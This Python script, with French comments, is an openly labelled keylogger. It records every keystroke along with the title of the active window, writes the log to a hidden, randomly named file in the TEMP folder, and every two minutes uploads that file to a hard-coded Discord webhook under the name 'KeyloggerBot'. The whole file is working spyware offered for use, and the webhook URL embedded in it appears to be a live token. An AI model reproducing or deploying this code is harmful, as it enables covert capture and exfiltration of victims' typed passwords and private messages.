#         ,-.-.                       .=-.-.         ,-.--, 
#,-..-.-./  \==\  _..---.    _.-.    /==/_ /.--.-.  /=/, .' 
#|, \=/\=|- |==|.' .'.-. \ .-,.'|   |==|, | \==\ -\/=/- /   
#|- |/ |/ , /==/==/- '=' /|==|, |   |==|  |  \==\ -' ,/    
# \, ,     _|==|==|-,   ' |==|- |   |==|- |   |==|,  - |    
# | -  -  , |==|==|  .=. \|==|, |   |==| ,|  /==/   ,   \   
#  \  ,  - /==//==/- '=' ,|==|- -._|==|- | /==/, .--, - \  
#  |-  /\ /==/|==|   -   //==/ - , ,/==/. / \==\- \/=/ , /  
#  --  -- -._.___,' -------'---   ---'  --   

import keyboard
import os
import time
import requests
from datetime import datetime
import random
import string
import pygetwindow as gw  

# le webhook xdxdxdxd
webhook_url = 'https://discord.com/api/webhooks/1306920579856601118/x30JkadIj1HtttObPxfv82ypbkwa2VIbYe0clJs1rlxu0SiUNW1FuSgB5S7ww65f9zcN'
last_sent_time = 0  

COOLDOWN_TIME = 120  

# génération nom
def generate_random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + ".txt"

# fichier dans temp
temp_dir = os.getenv('TEMP')

# nnom randome
log_file = os.path.join(temp_dir, generate_random_filename())

def get_active_window_title():
    """Obtenir le titre de la fenêtre active."""
    try:
        active_window = gw.getActiveWindow()  # prende la fenetre active 
        if active_window:
            return active_window.title  
        else:
            return "Fenetre inconnue"  # 0 fenetre
    except Exception as e:
        return "Fenetre inconnue"  # erreur

def on_key_press(event):
    """Log chaque pression de touche dans le fichier."""
    active_window = get_active_window_title()  # la fenetre active
    with open(log_file, 'a') as f:
        f.write(f'{event.name} in window: {active_window}\n')

keyboard.on_press(on_key_press)

def send_log_file():
    global last_sent_time
    # trouve l'heure
    now = datetime.now()
    formatted_time = now.strftime("%H:%M")  # mise à jour de l'heure

    # verifaction fichier
    if not os.path.exists(log_file):
        print(f"{log_file} fichier pas trouver, creation...")
        with open(log_file, 'w'): pass  # création du fichier s'il n'existe pas

    # message 
    with open(log_file, 'rb') as f:
        files = {
            'file': (log_file, f)
        }
        data = {
            'content': f'{formatted_time} Keylogger log file:',  
            'username': 'KeyloggerBot'  
        }
        
        response = requests.post(webhook_url, data=data, files=files)
        if response.status_code == 200:
            print("fichier envoyer !")
        else:
            print(f"Erreur a l'envoie: {response.status_code}")
    
    # réinitialiser le fichier
    os.remove(log_file)
    with open(log_file, 'w'): pass
    last_sent_time = time.time()

def check_and_send_log():
    global last_sent_time
    current_time = time.time()
    if current_time - last_sent_time >= COOLDOWN_TIME:
        send_log_file()
    else:
        print(f"Prochaine envoie dans : {int(COOLDOWN_TIME - (current_time - last_sent_time))} secondes.")

# cacher le fichier
os.system(f'attrib +h "{log_file}"')

try:
    print("Ctrl + c pour quitt er.")
    
    # appliquer le cooldown
    while True:
        check_and_send_log() 
        time.sleep(10)  

except KeyboardInterrupt:
    print('Sortie du keylogger.')
    send_log_file()  
    os.remove(log_file)
